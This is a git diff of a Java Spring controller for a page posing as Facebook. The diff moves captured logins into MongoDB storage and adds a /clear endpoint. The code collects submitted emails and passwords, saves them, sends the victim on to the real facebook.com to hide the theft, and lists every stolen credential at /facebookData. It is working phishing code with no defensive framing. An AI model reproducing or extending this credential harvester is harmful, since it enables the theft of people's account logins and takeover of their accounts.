@@ -1,4 +1,4 @@
-package com.example.Controllers;
+package com.example;
 
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -16,6 +16,8 @@ import java.util.List;
 @Controller
 public class facebook {
 
+      @Autowired
+      MongoRepo mongo;
 
     @RequestMapping("/facebook")
             public String facebook()
@@ -26,14 +28,24 @@ public class facebook {
     @RequestMapping(value = "/facebook" , method = RequestMethod.POST)
     public String facebook1(@RequestParam(value = "email" , required = false) String email , @RequestParam(value = "password",required = false) String password)
     {
-        list.add(email+" "+ password);
+         mongo.save(new User(email,password));
         return "redirect:http://www.facebook.com";
     }
 
     @RequestMapping("/facebookData")
     @ResponseBody
-    public List facebookData()
+    public  Iterable<User> list()
     {
-        return list;
+        return mongo.findAll();
     }
+    
+    @RequestMapping("/clear")
+    @ResponseBody
+    public  String list1()
+    {
+        mongo.deleteAll();
+        return "wow all cleard :D "; 
+    }
+    
+
 }
